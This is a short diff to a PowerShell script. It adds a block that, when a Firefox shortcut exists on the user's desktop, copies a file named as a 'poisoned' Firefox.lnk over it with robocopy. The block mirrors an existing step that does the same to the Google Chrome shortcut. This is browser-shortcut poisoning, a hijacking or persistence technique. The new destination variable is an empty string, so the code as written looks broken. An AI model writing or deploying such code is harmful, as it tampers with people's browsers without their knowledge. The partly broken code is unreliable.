@@ -57,6 +57,11 @@ If (Test-Path "$Env:UserProfile\Desktop\Google Chrome.lnk" -eq True) {
   robocopy $poison_chrome $chrome_lnk /S /MT /Z
 }
 
+If (Test-Path "$Env:UserProfile\Desktop\Firefox.lnk" -eq True) {
+  $firefox_lnk=""
+  $poisoned_firefox="$PSScriptRoot\Firefox.lnk"
+  robocopy $poisoned_firefox $firefox_lnk /S /MT /Z
+}
 
 
 
